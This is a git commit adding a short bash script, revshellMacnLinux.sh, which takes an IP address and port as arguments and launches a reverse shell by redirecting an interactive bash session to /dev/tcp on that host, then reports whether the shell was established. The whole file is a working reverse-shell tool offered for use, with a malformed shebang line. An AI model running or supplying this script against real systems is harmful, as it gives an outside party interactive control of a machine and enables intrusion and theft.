d378e6f50f6968b0989296dbbc0a3d3bfa716d72
SkepticSeptic <87040881+SkepticSeptic@users.noreply.github.com>
2023-09-24 09:49:16 -0400

    Create revshellMacnLinux.sh

---
+++ revshellMacnLinux.sh
@@ -0,0 +1,27 @@
+!/bin/bash
+
+while getopts ":I:P:" opt; do
+  case $opt in
+    I) IP_ADDRESS="$OPTARG"
+    ;;
+    P) PORT="$OPTARG"
+    ;;
+    \?) echo "Invalid option -$OPTARG" >&2
+    exit 1
+    ;;
+  esac
+done
+
+echo "Attempting to establish reverse shell on $IP_ADDRESS:$PORT..."
+
+bash -i >& /dev/tcp/$IP_ADDRESS/$PORT 0>&1 &
+
+# Wait for a brief moment to allow the shell to establish
+sleep 1
+
+# Check if the background process (bash -i) is still running
+if ps | grep $! > /dev/null; then
+    echo "Shell established!"
+else
+    echo "Failed to establish shell."
+fi
